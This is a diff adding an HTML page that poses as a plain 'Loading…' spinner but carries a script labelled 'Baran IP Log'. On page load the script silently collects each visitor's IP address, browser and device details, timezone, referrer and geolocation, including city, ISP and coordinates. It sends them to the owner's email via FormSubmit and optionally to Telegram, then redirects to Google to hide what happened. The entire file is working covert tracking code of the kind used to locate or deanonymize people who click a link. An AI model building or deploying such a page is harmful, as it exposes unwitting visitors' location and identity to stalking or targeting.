@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading…</title>
+<meta name="robots" content="noindex, nofollow">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:#f1f3f4;color:#3c4043;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.box{text-align:center}
+.spin{width:44px;height:44px;border:4px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 18px;animation:sp 1s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+p{font-size:14px;color:#5f6368}
+#dbg{display:none;text-align:left;background:#fff;border:1px solid #dadce0;border-radius:10px;padding:14px;font-size:12px;max-width:520px;margin:14px auto;white-space:pre-wrap;direction:ltr}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="spin"></div>
+<p id="msg">Loading, please wait…</p>
+<pre id="dbg"></pre>
+</div>
+<script>
+/* Baran IP Log — STATIC edition (GitHub Pages, always-on, no server).
+   Flow: fingerprint in browser → emailowner via FormSubmit (+Telegram if
+   configured) → silent redirect. See README for setup. */
+const CONFIG={
+  email:'baranavisat@gmail.com',
+  redirect:'https://www.google.com',
+  waitMs:2500,            // delay before redirect (lets data send)
+  timeoutMs:7000,         // max wait for APIs
+  tg:{token:'',chat:''}   // optional: fill PRIVATELY, never commit
+};
+const qs=new URLSearchParams(location.search);
+const DEBUG=qs.get('debug')==='1';
+function parseUA(ua){
+  ua=ua||'';let os='Unknown',br='Unknown';
+  const O=[[/iPhone|iPad|iPod/,'iOS'],[/Android/,'Android'],[/Windows NT 10/,'Windows 10/11'],[/Windows NT/,'Windows'],[/Mac OS X/,'Mac OS X'],[/Linux/,'Linux'],[/CrOS/,'ChromeOS']];
+  const B=[[/Edg\//,'Edge'],[/OPR\/|Opera/,'Opera'],[/Firefox\//,'Firefox'],[/Chrome\//,'Chrome'],[/Version\/.*Safari/,'Safari']];
+  for(const [rx,n] of O){if(rx.test(ua)){os=n;break;}}
+  for(const [rx,n] of B){if(rx.test(ua)){br=n;break;}}
+  const mv=ua.match(/(?:Chrome|Firefox|Version|Edg)\/([\d.]+)/);
+  return {os,browser:(br+(mv?' '+mv[1]:'')).trim(),device:/Mobile|Android|iPhone|iPad/.test(ua)?'Mobile':'Desktop'};
+}
+function withTimeout(p,ms,fb){
+  return Promise.race([p,new Promise(res=>setTimeout(()=>res(fb),ms))]);
+}
+async function collect(){
+  const data={time:new Date().toISOString(),ua:navigator.userAgent||'',
+    lang:navigator.language||'',langs:(navigator.languages||[]).join(','),
+    tz:(Intl.DateTimeFormat().resolvedOptions()||{}).timeZone||'',
+    screen:(screen.width||'?')+'x'+(screen.height||'?'),dpr:window.devicePixelRatio||1,
+    referrer:document.referrer||'Direct Link',url:location.href.split('?')[0]};
+  data.parsed=parseUA(data.ua);
+  try{
+    const ip=await withTimeout(fetch('https://api.ipify.org?format=json').then(r=>r.json()),5000,null);
+    if(ip&&ip.ip)data.ip=ip.ip;
+  }catch(e){}
+  try{
+    const g=await withTimeout(fetch('https://ipapi.co/'+(data.ip||'')+'/json/').then(r=>r.json()),5000,null);
+    if(g&&!g.error)data.geo={country:g.country_name||'',city:g.city||'',isp:g.org||'',lat:g.latitude,lon:g.longitude};
+  }catch(e){}
+  if(!data.geo){
+    try{
+      const g2=await withTimeout(fetch('https://ipwho.is/'+(data.ip||'')).then(r=>r.json()),5000,null);
+      if(g2&&g2.success)data.geo={country:g2.country||'',city:g2.city||'',isp:(g2.connection||{}).isp||'',lat:g2.latitude,lon:g2.longitude};
+    }catch(e){}
+  }
+  return data;
+}
+function lines(d){
+  const g=d.geo||{};
+  return ['[+] New Connection (static logger)', 'IP: '+(d.ip||'-'),
+    'Country: '+(g.country||'-')+' | City: '+(g.city||'-'), 'ISP: '+(g.isp||'-'),
+    'OS: '+d.parsed.os+' | Browser: '+d.parsed.browser+' ('+d.parsed.device+')',
+    'Lang: '+d.lang+' | TZ: '+d.tz, 'Screen: '+d.screen,
+    'Referer: '+d.referrer, 'Time: '+d.time].join('\n');
+}
+async function deliver(d){
+  const jobs=[];
+  jobs.push(withTimeout(fetch('https://formsubmit.co/ajax/'+encodeURIComponent(CONFIG.email),{
+    method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},
+    body:JSON.stringify({name:'Baran IP Log',message:lines(d),_subject:'🛰️ New connection: '+(d.ip||'unknown'),_template:'table'})}).catch(()=>null),6000,null));
+  if(CONFIG.tg.token&&CONFIG.tg.chat){
+    jobs.push(withTimeout(fetch('https://api.telegram.org/bot'+CONFIG.tg.token+'/sendMessage',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CONFIG.tg.chat,text:lines(d).slice(0,3500)})}).catch(()=>null),6000,null));
+  }
+  await Promise.all(jobs);
+}
+(async function(){
+  const t0=Date.now();
+  const d=await collect();
+  if(DEBUG){document.getElementById('dbg').style.display='block';document.getElementById('dbg').textContent=lines(d)+'\n\n'+JSON.stringify(d,null,1);document.getElementById('msg').textContent='DEBUG mode — no redirect.';return;}
+  deliver(d).catch(()=>{});
+  const wait=Math.max(0,CONFIG.waitMs-(Date.now()-t0));
+  setTimeout(()=>{location.replace(CONFIG.redirect);},wait);
+})();
+</script>
+</body>
+</html>
